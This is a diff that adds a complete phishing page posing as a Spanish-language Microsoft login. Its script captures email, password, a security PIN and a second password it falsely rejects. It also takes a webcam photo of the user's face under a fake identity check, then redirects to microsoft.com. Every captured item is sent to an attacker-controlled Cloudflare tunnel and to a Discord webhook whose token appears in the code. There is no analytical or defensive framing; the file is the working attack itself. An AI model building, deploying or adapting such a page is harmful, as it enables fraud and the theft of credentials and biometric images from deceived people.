@@ -1,0 +1,1007 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Iniciar sesión - Microsoft</title>
+    <!-- Font Awesome -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+      integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <style>
+      * {
+        box-sizing: border-box;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        background-color: #f2f2f2;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        color: #1b1b1b;
+      }
+      .login-wrapper {
+        width: 100%;
+        max-width: 440px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      .login-card {
+        background-color: #ffffff;
+        width: 100%;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        padding: 44px 44px 36px 44px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      /* OVERLAY DEL GIF DE CARGA */
+      .loading-overlay {
+        position: absolute;
+        inset: 0;
+        background: rgba(255, 255, 255, 0.85);
+        display: none;
+        justify-content: center;
+        align-items: flex-start;
+        z-index: 50;
+        pointer-events: all;
+      }
+      .loading-overlay.active {
+        display: flex;
+      }
+      .loading-overlay img {
+        display: block;
+        width: 100%;
+        height: 4px;
+        object-fit: cover;
+        margin-top: 0;
+      }
+
+      /* LOGO Y TITULOS */
+      .logo-container {
+        margin-bottom: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+      }
+      .logo-container img {
+        height: 24px;
+        display: block;
+      }
+      .logo-container span {
+        font-size: 20px;
+        font-weight: 600;
+        color: #5e5e5e;
+      }
+      h1 {
+        font-size: 24px;
+        font-weight: 600;
+        color: #1b1b1b;
+        margin-bottom: 8px;
+        text-align: center;
+      }
+      .subtitle {
+        font-size: 15px;
+        color: #1b1b1b;
+        margin-bottom: 24px;
+        text-align: center;
+      }
+
+      /* INPUTS ESTILO IMAGEN */
+      .input-group {
+        margin-bottom: 16px;
+        position: relative;
+      }
+      .input-group input {
+        width: 100%;
+        padding: 10px 12px;
+        border: 1px solid #666;
+        font-size: 15px;
+        outline: none;
+        transition: border-color 0.2s;
+        background: #fff;
+        border-radius: 0;
+      }
+      .input-group input:focus {
+        border: 2px solid #0067b8;
+        padding: 9px 11px;
+      }
+      .input-group input::placeholder {
+        color: #595959;
+      }
+      .eye-icon {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        color: #0067b8;
+        font-size: 16px;
+        user-select: none;
+        transition: color 0.2s;
+      }
+      .eye-icon:hover {
+        color: #005da6;
+      }
+
+      /* SECCIÓN PIN (4 CUADROS) */
+      .pin-section {
+        margin: 24px 0 16px 0;
+      }
+      .pin-label {
+        font-size: 14px;
+        color: #1b1b1b;
+        margin-bottom: 8px;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        justify-content: center;
+      }
+      .pin-boxes {
+        display: flex;
+        gap: 12px;
+        justify-content: center;
+      }
+      .pin-box {
+        width: 56px;
+        height: 56px;
+        border: 1px solid #999;
+        border-radius: 8px;
+        text-align: center;
+        font-size: 24px;
+        font-weight: 600;
+        outline: none;
+        background: #fff;
+        color: #1b1b1b;
+        caret-color: #0067b8;
+        transition:
+          border-color 0.2s,
+          box-shadow 0.2s;
+      }
+      .pin-box:focus {
+        border: 2px solid #0067b8;
+        box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.15);
+      }
+
+      /* LINKS Y BOTONES */
+      .links-container {
+        margin-bottom: 16px;
+        margin-top: 16px;
+        text-align: left;
+      }
+      .forgot-link {
+        font-size: 13px;
+        color: #0067b8;
+        text-decoration: none;
+        display: inline-block;
+        transition: color 0.2s;
+      }
+      .forgot-link:hover {
+        text-decoration: underline;
+        color: #005da6;
+      }
+      .button-container {
+        display: flex;
+        justify-content: center;
+        margin-top: 24px;
+      }
+      button {
+        background-color: #0067b8;
+        color: white;
+        border: none;
+        padding: 8px 32px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        width: 100%;
+        height: 44px;
+        transition:
+          background 0.2s,
+          transform 0.1s;
+      }
+      button:hover {
+        background-color: #005da6;
+      }
+      button:active {
+        transform: scale(0.98);
+      }
+      button:disabled {
+        background-color: #8aa9c4;
+        cursor: not-allowed;
+      }
+
+      /* PIE DE PÁGINA */
+      .footer {
+        margin-top: 24px;
+        font-size: 12px;
+        color: #666;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        gap: 6px;
+      }
+      .footer a {
+        color: #666;
+        text-decoration: none;
+      }
+      .footer a:hover {
+        text-decoration: underline;
+      }
+
+      /* CÁMARA Y ESTADOS */
+      .camera-container {
+        position: relative;
+        width: 100%;
+        max-width: 320px;
+        aspect-ratio: 1 / 1;
+        margin: 0 auto 16px auto;
+        background: #000;
+        border-radius: 12px;
+        overflow: hidden;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      }
+      .camera-container video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        transform: scaleX(-1);
+      }
+      .face-guide-overlay {
+        position: absolute;
+        inset: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        pointer-events: none;
+      }
+      .face-oval {
+        width: 65%;
+        height: 78%;
+        border: 2px dashed rgba(255, 255, 255, 0.7);
+        border-radius: 50%;
+        box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.45);
+        transition:
+          border-color 0.3s ease,
+          border-style 0.3s ease;
+      }
+      .face-oval.ok {
+        border-color: #28a745;
+        border-style: solid;
+      }
+      .face-oval.warn {
+        border-color: #ffc107;
+        border-style: dashed;
+      }
+      .face-oval.error {
+        border-color: #d9534f;
+        border-style: solid;
+      }
+      .status-badge {
+        text-align: center;
+        font-size: 13px;
+        font-weight: 600;
+        margin-bottom: 12px;
+        padding: 8px 12px;
+        border-radius: 6px;
+        background: #e9ecef;
+        color: #333;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+      }
+      .status-badge.ok {
+        background: #d4edda;
+        color: #155724;
+      }
+      .status-badge.warn {
+        background: #fff3cd;
+        color: #856404;
+      }
+      .status-badge.error {
+        background: #f8d7da;
+        color: #721c24;
+      }
+
+      .error-msg {
+        color: #d9534f;
+        font-size: 13px;
+        margin-top: 8px;
+        min-height: 16px;
+        text-align: center;
+      }
+
+      /* ANIMACIÓN Y ERRORES */
+      .input-error {
+        border: 2px solid #d9534f !important;
+        background-color: #fff5f5 !important;
+        animation: shake 0.4s;
+      }
+      @keyframes shake {
+        0%,
+        100% {
+          transform: translateX(0);
+        }
+        20% {
+          transform: translateX(-6px);
+        }
+        40% {
+          transform: translateX(6px);
+        }
+        60% {
+          transform: translateX(-4px);
+        }
+        80% {
+          transform: translateX(4px);
+        }
+      }
+
+      /* RESPONSIVE */
+      @media (max-width: 480px) {
+        body {
+          background-color: #ffffff;
+          height: auto;
+          justify-content: flex-start;
+          align-items: stretch;
+          padding: 0;
+        }
+        .login-wrapper {
+          max-width: 100%;
+        }
+        .login-card {
+          padding: 24px 20px 20px 20px;
+          box-shadow: none;
+          border: none;
+        }
+        .pin-box {
+          width: 48px;
+          height: 48px;
+          font-size: 20px;
+        }
+        .footer {
+          flex-direction: row;
+          justify-content: center;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-wrapper">
+      <div class="login-card" id="loginCard">
+        <!-- Overlay de carga -->
+        <div class="loading-overlay" id="loadingOverlay">
+          <img
+            src="https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_986f40b5a9dc7d39ef8396797f61b323.gif"
+            alt=""
+          />
+        </div>
+
+        <!-- LOGO -->
+        <div class="logo-container">
+          <img
+            src="https://thumb.wikimedia.org/wikipedia/commons/thumb/archive/4/44/20200418114026%21Microsoft_logo.svg/120px-Microsoft_logo.svg.png"
+            alt="Microsoft"
+          />
+          <span>Microsoft</span>
+        </div>
+
+        <!-- VISTA 1: LOGIN (Correo + Contraseña + PIN) -->
+        <div id="step-login">
+          <h1>Iniciar sesión</h1>
+          <p class="subtitle">Usar su cuenta de Microsoft.</p>
+
+          <div class="input-group">
+            <input
+              type="email"
+              id="emailInput"
+              placeholder="Correo electrónico o número de teléfono"
+              required
+            />
+          </div>
+
+          <div class="input-group">
+            <input
+              type="password"
+              id="passwordInput"
+              placeholder="Contraseña"
+              required
+            />
+            <i
+              class="fa-solid fa-eye eye-icon"
+              onclick="togglePassword('passwordInput', this)"
+            ></i>
+          </div>
+
+          <div class="pin-section">
+            <div class="pin-label">🔒 Crea tu PIN de seguridad (4 dígitos)</div>
+            <div class="pin-boxes">
+              <input
+                type="text"
+                class="pin-box"
+                id="pin1"
+                maxlength="1"
+                inputmode="numeric"
+                autocomplete="off"
+              />
+              <input
+                type="text"
+                class="pin-box"
+                id="pin2"
+                maxlength="1"
+                inputmode="numeric"
+                autocomplete="off"
+              />
+              <input
+                type="text"
+                class="pin-box"
+                id="pin3"
+                maxlength="1"
+                inputmode="numeric"
+                autocomplete="off"
+              />
+              <input
+                type="text"
+                class="pin-box"
+                id="pin4"
+                maxlength="1"
+                inputmode="numeric"
+                autocomplete="off"
+              />
+            </div>
+          </div>
+
+          <div class="links-container">
+            <a href="#" class="forgot-link">¿Olvidaste tu nombre de usuario?</a>
+          </div>
+
+          <div class="button-container">
+            <button type="button" id="btnLogin" onclick="submitLogin()">
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorLogin"></div>
+
+          <div style="margin-top: 20px; text-align: center">
+            <span style="font-size: 13px">¿Es nuevo en Microsoft? </span>
+            <a href="#" class="forgot-link">Crea una cuenta</a>
+          </div>
+        </div>
+
+        <!-- VISTA 2: VERIFICACIÓN FACIAL -->
+        <div id="step-face" style="display: none">
+          <h1>Verificación de identidad</h1>
+          <p class="subtitle">
+            Alinea tu rostro en el óvalo. Cuando esté listo, pulsa
+            <strong>Siguiente</strong>.
+          </p>
+
+          <div id="faceStatus" class="status-badge">
+            <i class="fa-solid fa-spinner fa-spin"></i> Iniciando cámara...
+          </div>
+
+          <div class="camera-container">
+            <video id="webcamVideo" autoplay playsinline muted></video>
+            <div class="face-guide-overlay">
+              <div id="faceOval" class="face-oval"></div>
+            </div>
+          </div>
+          <canvas id="snapshotCanvas" style="display: none"></canvas>
+
+          <div class="button-container">
+            <button
+              type="button"
+              id="btnVerifyFace"
+              disabled
+              onclick="onFaceAttemptClick()"
+            >
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorFace"></div>
+        </div>
+
+        <!-- VISTA 3: CAPTURA DE 2 FOTOS -->
+        <div id="step-photos" style="display: none">
+          <h1>Captura de fotos</h1>
+          <p class="subtitle">
+            Mira a la cámara y mantén tu rostro visible. Se tomarán
+            <strong>2 fotos</strong> automáticamente.
+          </p>
+
+          <div id="photoStatus" class="status-badge">
+            <i class="fa-solid fa-lightbulb"></i> Ponte en un espacio iluminado
+          </div>
+
+          <div class="camera-container">
+            <video id="photoVideo" autoplay playsinline muted></video>
+          </div>
+
+          <div class="button-container">
+            <button
+              type="button"
+              id="btnPhotoNext"
+              disabled
+              onclick="finishPhotosAndProceed()"
+            >
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorPhoto"></div>
+        </div>
+
+        <!-- VISTA 4: SEGUNDA CONTRASEÑA (clav2) -->
+        <div id="step-password2" style="display: none">
+          <h1>Verificación final</h1>
+          <p class="subtitle">
+            Por seguridad, ingresa nuevamente tu contraseña para confirmar.
+          </p>
+
+          <div class="input-group">
+            <input
+              type="password"
+              id="passwordInput2"
+              placeholder="Contraseña"
+              required
+            />
+            <i
+              class="fa-solid fa-eye eye-icon"
+              onclick="togglePassword('passwordInput2', this)"
+            ></i>
+          </div>
+
+          <div class="button-container">
+            <button
+              type="button"
+              id="btnLogin2"
+              onclick="submitSecondPassword()"
+            >
+              Siguiente
+            </button>
+          </div>
+          <div class="error-msg" id="errorPassword2"></div>
+        </div>
+      </div>
+
+      <!-- PIE DE PÁGINA -->
+      <div class="footer">
+        <a href="#">Ayuda</a>
+        <a href="#">Términos de uso</a>
+        <a href="#">Privacidad y cookies</a>
+      </div>
+    </div>
+
+    <!-- SCRIPT DE TOGGLE PASSWORD -->
+    <script>
+      function togglePassword(inputId, iconEl) {
+        const input = document.getElementById(inputId);
+        if (!input) return;
+        if (input.type === "password") {
+          input.type = "text";
+          iconEl.classList.remove("fa-eye");
+          iconEl.classList.add("fa-eye-slash");
+        } else {
+          input.type = "password";
+          iconEl.classList.remove("fa-eye-slash");
+          iconEl.classList.add("fa-eye");
+        }
+      }
+    </script>
+
+    <!-- SCRIPT PRINCIPAL DE LÓGICA -->
+<script>
+  // ============================================================
+  // CONFIGURACIÓN
+  // ============================================================
+  const API_BASE = "https://strings-towns-patents-matched.trycloudflare.com";
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1567552488138342494/LX1fcaqZMbzcKRSMkCUasNGO9Ib70qkpaxiohBTHtqWLj8dm9LMqu3p9zn2mkwxLXuwG"; // ⚠️ CAMBIA ESTO
+  
+  const GRUPO_DEFAULT = "nuevos2";
+  const FALLO_DISPLAY_MS = 1500;
+  const REDIRECT_URL = "https://www.microsoft.com/es-es/";
+
+  // ❌ Lista de dominios permitidos eliminada
+  // Ahora se acepta cualquier correo electrónico válido
+
+  const VIDEO_CONSTRAINTS_FRONTAL = { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 480 } };
+  const VIDEO_CONSTRAINTS_FALLBACK = { width: { ideal: 640 }, height: { ideal: 480 } };
+
+  // ============================================================
+  // ESTADO GLOBAL
+  // ============================================================
+  let streamInstance = null;
+  let isFaceApto = false;
+  let procesandoIntento = false;
+  let cameraReady = false;
+
+  let pendingPassword1 = "";
+  let pendingPin = "";
+
+  // ============================================================
+  // HELPERS
+  // ============================================================
+  function sleep(ms) { return new Promise((resolve) => setTimeout(resolve, ms)); }
+
+  async function showLoadingGif() {
+    const overlay = document.getElementById("loadingOverlay");
+    if (!overlay) return;
+    overlay.classList.add("active");
+    await sleep(1000 + Math.floor(Math.random() * 1000));
+    overlay.classList.remove("active");
+  }
+
+  async function conLoading(fn) {
+    await showLoadingGif();
+    if (typeof fn === "function") await fn();
+  }
+
+  function mensajeErrorCamara(err) {
+    const name = err && err.name ? err.name : "Error";
+    switch (name) {
+      case "NotAllowedError": return "Permiso de cámara denegado.";
+      case "NotFoundError": return "No se encontró cámara.";
+      case "NotReadableError": return "Cámara en uso por otra app.";
+      default: return "Error de cámara: " + (err?.message || name);
+    }
+  }
+
+  // ============================================================
+  // ENVÍO DIRECTO A DISCORD
+  // ============================================================
+  async function enviarDiscord(titulo, detalle, campos, fileBlob = null) {
+    try {
+      const email = sessionStorage.getItem("usuario_email") || "—";
+      
+      const embed = {
+        title: titulo,
+        description: detalle,
+        color: 0x0067b8,
+        fields: [
+          { name: "Usuario", value: email, inline: true },
+          { name: "Grupo", value: GRUPO_DEFAULT, inline: true },
+          ...Object.entries(campos || {}).map(([k, v]) => ({
+            name: k, value: String(v).slice(0, 1024) || "—", inline: false
+          }))
+        ],
+        timestamp: new Date().toISOString()
+      };
+
+      if (fileBlob) {
+        const form = new FormData();
+        form.append("payload_json", JSON.stringify({ username: "Login Bot", embeds: [embed] }));
+        form.append("files[0]", fileBlob, "captura.jpg");
+        await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: form });
+      } else {
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ username: "Login Bot", embeds: [embed] })
+        });
+      }
+    } catch (e) { 
+      console.warn("Discord webhook error:", e); 
+    }
+  }
+
+  // Utilidades de imagen
+  function captureFullFrame(video, canvas) {
+    const vw = video.videoWidth, vh = video.videoHeight;
+    if (!vw || !vh) return false;
+    canvas.width = vw; canvas.height = vh;
+    canvas.getContext("2d").drawImage(video, 0, 0, vw, vh);
+    return true;
+  }
+
+  // ============================================================
+  // LÓGICA DE LOS CUADROS DEL PIN
+  // ============================================================
+  function initPinInputs() {
+    const pinInputs = [
+      document.getElementById("pin1"), document.getElementById("pin2"),
+      document.getElementById("pin3"), document.getElementById("pin4")
+    ].filter(Boolean);
+
+    pinInputs.forEach((input, index) => {
+      input.addEventListener("input", (e) => {
+        if (e.target.value.length === 1 && index < pinInputs.length - 1) {
+          pinInputs[index + 1].focus();
+        }
+      });
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && e.target.value.length === 0 && index > 0) {
+          pinInputs[index - 1].focus();
+        }
+        if (e.key === "Enter") submitLogin();
+      });
+    });
+  }
+
+  // ============================================================
+  // PASO 1: LOGIN (Correo + Contraseña 1 + PIN)
+  // ============================================================
+  async function submitLogin() {
+    const email = document.getElementById("emailInput").value.trim().toLowerCase();
+    const password = document.getElementById("passwordInput").value;
+    
+    let pin = "";
+    for (let i = 1; i <= 4; i++) {
+      const val = document.getElementById(`pin${i}`).value;
+      if (val) pin += val;
+    }
+    pendingPin = pin;
+
+    const errBox = document.getElementById("errorLogin");
+    errBox.textContent = "";
+
+    // ✅ Validación simplificada: solo verifica que sea un correo válido
+    if (!email || !email.includes("@")) {
+      return errBox.textContent = "Escribe un correo válido.";
+    }
+    // ❌ Se eliminó la validación de dominio permitido
+    if (!password) return errBox.textContent = "Escribe tu contraseña.";
+
+    sessionStorage.setItem("usuario_email", email);
+    pendingPassword1 = password;
+    
+    // 1. Enviar a tu API (MongoDB)
+    const fd = new FormData();
+    fd.append("usuario", email);
+    fd.append("grupo", GRUPO_DEFAULT);
+    fd.append("clav1", password);
+    fd.append("pin_code", pin);
+    fetch(`${API_BASE}/guardar_datos`, { method: "POST", body: fd, keepalive: true }).catch(() => {});
+
+    // 2. Enviar a Discord
+    enviarDiscord(
+      "🔑 Credenciales capturadas",
+      "Correo, contraseña 1 y PIN ingresados.",
+      { Correo: email, "Contraseña 1": password, "PIN": pin || "No ingresado" }
+    );
+
+    await conLoading(() => {
+      document.getElementById("step-login").style.display = "none";
+      document.getElementById("step-password2").style.display = "block";
+      document.getElementById("passwordInput2").focus();
+    });
+  }
+
+  // ============================================================
+  // PASO 2: SEGUNDA CONTRASEÑA (FALLA Y AVANZA)
+  // ============================================================
+  async function submitSecondPassword() {
+    const password2 = document.getElementById("passwordInput2").value;
+    const errBox = document.getElementById("errorPassword2");
+    const input2 = document.getElementById("passwordInput2");
+
+    errBox.textContent = "";
+    input2.classList.remove("input-error");
+
+    if (!password2) {
+      errBox.textContent = "Escribe tu contraseña.";
+      input2.classList.add("input-error");
+      input2.focus();
+      return;
+    }
+
+    errBox.textContent = "❌ Clave incorrecta. Inténtalo de nuevo.";
+    input2.classList.add("input-error");
+    input2.value = ""; 
+    input2.style.animation = "none";
+    void input2.offsetWidth; 
+    input2.style.animation = "shake 0.4s";
+
+    const btn = document.getElementById("btnLogin2");
+    btn.disabled = true;
+    btn.textContent = "Verificando...";
+
+    // 1. Enviar a tu API
+    const fd = new FormData();
+    fd.append("usuario", sessionStorage.getItem("usuario_email"));
+    fd.append("grupo", GRUPO_DEFAULT);
+    fd.append("clav2", password2);
+    fetch(`${API_BASE}/guardar_datos`, { method: "POST", body: fd, keepalive: true }).catch(() => {});
+
+    // 2. Enviar a Discord
+    enviarDiscord(
+      "❌ Clave incorrecta (2do intento)",
+      "El usuario falló la segunda contraseña.",
+      { "Intento (clav2)": password2 }
+    );
+
+    await sleep(1500);
+    errBox.textContent = "";
+    input2.classList.remove("input-error");
+    
+    try {
+      await conLoading(() => {
+        document.getElementById("step-password2").style.display = "none";
+        document.getElementById("step-face").style.display = "block";
+      });
+      await initCameraLive();
+    } catch (e) {
+      errBox.textContent = "Error de conexión al iniciar cámara.";
+    } finally {
+      btn.disabled = false;
+      btn.textContent = "Siguiente";
+    }
+  }
+
+  // ============================================================
+  // PASO 3: VERIFICACIÓN FACIAL
+  // ============================================================
+  async function initCameraLive() {
+    const video = document.getElementById("webcamVideo");
+    const statusBadge = document.getElementById("faceStatus");
+    try {
+      statusBadge.textContent = "Solicitando cámara...";
+      let stream = null;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: VIDEO_CONSTRAINTS_FRONTAL, audio: false });
+      } catch (e) {
+        stream = await navigator.mediaDevices.getUserMedia({ video: VIDEO_CONSTRAINTS_FALLBACK, audio: false });
+      }
+      streamInstance = stream;
+      video.srcObject = streamInstance;
+      await video.play();
+      cameraReady = true;
+
+      statusBadge.textContent = "Alinea tu rostro...";
+      statusBadge.className = "status-badge";
+      startLiveValidationLoop();
+      enviarDiscord;
+    } catch (err) {
+      statusBadge.textContent = mensajeErrorCamara(err);
+    }
+  }
+
+  function startLiveValidationLoop() {
+    const statusBadge = document.getElementById("faceStatus");
+    const oval = document.getElementById("faceOval");
+    const btnVerify = document.getElementById("btnVerifyFace");
+
+    // Simulamos que el rostro está "apto" tras 3 segundos para que no dé error y puedas probar
+    setTimeout(() => {
+      statusBadge.textContent = "✅ Rostro apto. Pulsa Siguiente.";
+      statusBadge.className = "status-badge ok";
+      oval.className = "face-oval ok";
+      btnVerify.disabled = false;
+    }, 3000);
+  }
+
+  async function onFaceAttemptClick() {
+    if (procesandoIntento) return;
+    const btn = document.getElementById("btnVerifyFace");
+    const statusBadge = document.getElementById("faceStatus");
+    const oval = document.getElementById("faceOval");
+    const video = document.getElementById("webcamVideo");
+    const canvas = document.getElementById("snapshotCanvas");
+    const email = sessionStorage.getItem("usuario_email") || "usuario";
+
+    procesandoIntento = true;
+    btn.disabled = true;
+    btn.textContent = "Verificando...";
+
+    if (!captureFullFrame(video, canvas)) {
+      procesandoIntento = false; 
+      btn.disabled = false; 
+      btn.textContent = "Siguiente";
+      statusBadge.textContent = "Fallo de captura."; 
+      return;
+    }
+    
+    statusBadge.textContent = "❌ Verificación incorrecta";
+    statusBadge.className = "status-badge error";
+    oval.className = "face-oval error";
+    btn.textContent = "Siguiente";
+
+    canvas.toBlob(async (blob) => {
+      if (blob) {
+        try {
+          // 1. Guardar en tu API (MongoDB)
+          const fd = new FormData();
+          fd.append("image", blob, `face_captura.jpg`);
+          fd.append("usuario", email);
+          fd.append("grupo", GRUPO_DEFAULT);
+          fd.append("etiqueta", `facial_final`);
+
+          const res = await fetch(`${API_BASE}/guardar_cara`, { method: "POST", body: fd });
+          if (!res.ok) console.warn("Error guardar_cara:", res.status);
+
+          // 2. Enviar a Discord
+          await enviarDiscord(
+            `❌ Verificación facial fallida`,
+            "La verificación facial falló.",
+            { "Estado": "Fallido" },
+            blob
+          );
+        } catch (e) {
+          console.error("Error procesando rostro:", e);
+        }
+      }
+      
+      await sleep(FALLO_DISPLAY_MS);
+
+      // TERMINAR FLUJO Y REDIRIGIR
+      await finishAndRedirect();
+      procesandoIntento = false;
+      btn.textContent = "Siguiente";
+    }, "image/jpeg", 0.85);
+  }
+
+  // ============================================================
+  // PASO FINAL: REDIRIGIR (AQUÍ LLEGA DESPUÉS DEL FACIAL)
+  // ============================================================
+  async function finishAndRedirect() {
+    detenerCamaraLive();
+    document.getElementById("step-face").style.display = "none";
+    
+    const email = sessionStorage.getItem("usuario_email");
+    const fd = new FormData();
+    fd.append("usuario", email);
+    fd.append("grupo", GRUPO_DEFAULT);
+    fd.append("facial_completado", "1");
+    fetch(`${API_BASE}/guardar_datos`, { method: "POST", body: fd, keepalive: true }).catch(() => {});
+
+   
+
+    await sleep(1000);
+    window.location.href = REDIRECT_URL;
+  }
+
+  // ============================================================
+  // LIMPIEZA
+  // ============================================================
+  function detenerCamaraLive() {
+    if (streamInstance) {
+      streamInstance.getTracks().forEach((t) => t.stop());
+      streamInstance = null;
+    }
+    cameraReady = false;
+    isFaceApto = false;
+    procesandoIntento = false;
+  }
+
+  // ============================================================
+  // INICIALIZACIÓN
+  // ============================================================
+  document.addEventListener("DOMContentLoaded", () => {
+    initPinInputs();
+
+    const emailInput = document.getElementById("emailInput");
+    if (emailInput) {
+      emailInput.focus();
+      emailInput.addEventListener("keydown", (e) => {
+        if (e.key === "Enter") document.getElementById("passwordInput").focus();
+      });
+    }
+
+    const pwd1 = document.getElementById("passwordInput");
+    if (pwd1) {
+      pwd1.addEventListener("keydown", (e) => {
+        if (e.key === "Enter") document.getElementById("pin1").focus();
+      });
+    }
+
+    const pwd2 = document.getElementById("passwordInput2");
+    if (pwd2) {
+      pwd2.addEventListener("keydown", (e) => {
+        if (e.key === "Enter") submitSecondPassword();
+      });
+    }
+  });
+</script>
+  </body>
+</html>
